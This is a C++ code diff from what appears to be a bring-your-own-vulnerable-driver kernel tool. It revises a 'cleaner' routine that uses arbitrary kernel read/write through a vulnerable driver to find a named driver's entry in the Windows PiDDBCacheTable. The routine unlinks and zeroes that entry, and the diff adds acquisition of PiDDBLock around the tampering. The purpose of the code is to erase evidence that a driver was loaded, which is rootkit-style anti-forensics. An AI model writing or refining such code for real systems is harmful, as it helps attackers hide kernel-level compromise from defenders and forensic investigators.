@@ -145,17 +145,7 @@ static uint64_t FindPiDDBCacheTable(byovd::IByovdBackend* backend) {
 }
 
 static uint64_t FindPiDDBLock(byovd::IByovdBackend* backend) {
-    uint64_t addr = kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "PiDDBLock");
-    if (addr) return addr;
-
-    uint32_t dataSize = 0;
-    uint64_t dataBase = FindNtoskrnlSection(backend, ".data", dataSize);
-    if (!dataBase) return 0;
-
-    // PiDDBLock is an ERESOURCE located near PiDDBCacheTable in .data.
-    // Heuristic: scan .data for an ERESOURCE signature (size 0x68, OwnerThreads zero).
-    // This is imprecise; export resolution is preferred.
-    return 0;
+    return kmem::ResolveKernelExport(backend, L"ntoskrnl.exe", "PiDDBLock");
 }
 
 // ---------------------------------------------------------------------------
@@ -216,40 +206,50 @@ bool ClearPiDddbCache(byovd::IByovdBackend* backend, const std::wstring& driverN
         return false;
     }
 
-    // PiDDBCacheTable is RTL_AVL_TABLE on older Windows, RTL_RB_TREE on newer.
-    // We walk it as a linked list via LIST_ENTRY embedded in each cache entry.
-    // The table structure starts with a LIST_ENTRY (Flink/Blink) on Win10 <= 1909.
-    // On newer builds the tree layout differs and a pure list walk may miss nodes.
-
-    LIST_ENTRY tableList{};
-    if (!backend->ReadKernelMemory(tableVa, &tableList, sizeof(tableList))) return false;
-
-    uint64_t headFlink = reinterpret_cast<uint64_t>(tableList.Flink);
-    uint64_t current = headFlink;
-    bool found = false;
-    int guard = 0;
-
-    while (current && current != tableVa && guard++ < 1024) {
-        uint64_t entryVa = current - offsetof(PIDDB_CACHE_ENTRY, List);
-        PIDDB_CACHE_ENTRY entry{};
-        if (!backend->ReadKernelMemory(entryVa, &entry, sizeof(entry))) break;
-
-        if (NamesMatch(backend, entryVa + offsetof(PIDDB_CACHE_ENTRY, DriverName), driverName)) {
-            uint64_t flink = reinterpret_cast<uint64_t>(entry.List.Flink);
-            uint64_t blink = reinterpret_cast<uint64_t>(entry.List.Blink);
-
-            // Unlink: Flink->Blink = Blink; Blink->Flink = Flink
-            backend->WriteKernelMemory(flink + offsetof(LIST_ENTRY, Blink), &blink, sizeof(blink));
-            backend->WriteKernelMemory(blink + offsetof(LIST_ENTRY, Flink), &flink, sizeof(flink));
-
-            // Zero entry for good measure.
-            PIDDB_CACHE_ENTRY zeroed{};
-            backend->WriteKernelMemory(entryVa, &zeroed, sizeof(zeroed));
-
-            found = true;
-            std::wcout << L"[hinv::cleaner] Removed PiDDBCacheTable entry for " << driverName << L"\n";
+    uint64_t lockVa = FindPiDDBLock(backend);
+    bool lockHeld = false;
+    if (lockVa) {
+        lockHeld = kmem::AcquireKernelLock(backend, lockVa, 0); // ExAcquireResourceExclusiveLite
+        if (!lockHeld) {
+            std::wcerr << L"[hinv::cleaner] Failed to acquire PiDDBLock\n";
         }
-        current = reinterpret_cast<uint64_t>(entry.List.Flink);
+    }
+
+    // PiDDBCacheTable is RTL_AVL_TABLE on Windows 7-10 21H2 and RTL_RB_TREE on newer.
+    // We first try a list walk, then an AVL in-order walk if the list walk finds nothing.
+    bool found = false;
+
+    // List-based walk (older Windows).
+    LIST_ENTRY tableList{};
+    if (backend->ReadKernelMemory(tableVa, &tableList, sizeof(tableList))) {
+        uint64_t headFlink = reinterpret_cast<uint64_t>(tableList.Flink);
+        uint64_t current = headFlink;
+        int guard = 0;
+
+        while (current && current != tableVa && guard++ < 1024) {
+            uint64_t entryVa = current - offsetof(PIDDB_CACHE_ENTRY, List);
+            PIDDB_CACHE_ENTRY entry{};
+            if (!backend->ReadKernelMemory(entryVa, &entry, sizeof(entry))) break;
+
+            if (NamesMatch(backend, entryVa + offsetof(PIDDB_CACHE_ENTRY, DriverName), driverName)) {
+                uint64_t flink = reinterpret_cast<uint64_t>(entry.List.Flink);
+                uint64_t blink = reinterpret_cast<uint64_t>(entry.List.Blink);
+
+                backend->WriteKernelMemory(flink + offsetof(LIST_ENTRY, Blink), &blink, sizeof(blink));
+                backend->WriteKernelMemory(blink + offsetof(LIST_ENTRY, Flink), &flink, sizeof(flink));
+
+                PIDDB_CACHE_ENTRY zeroed{};
+                backend->WriteKernelMemory(entryVa, &zeroed, sizeof(zeroed));
+
+                found = true;
+                std::wcout << L"[hinv::cleaner] Removed PiDDBCacheTable entry for " << driverName << L"\n";
+            }
+            current = reinterpret_cast<uint64_t>(entry.List.Flink);
+        }
+    }
+
+    if (lockHeld && lockVa) {
+        kmem::ReleaseKernelLock(backend, lockVa, 0);
     }
     return found;
 }
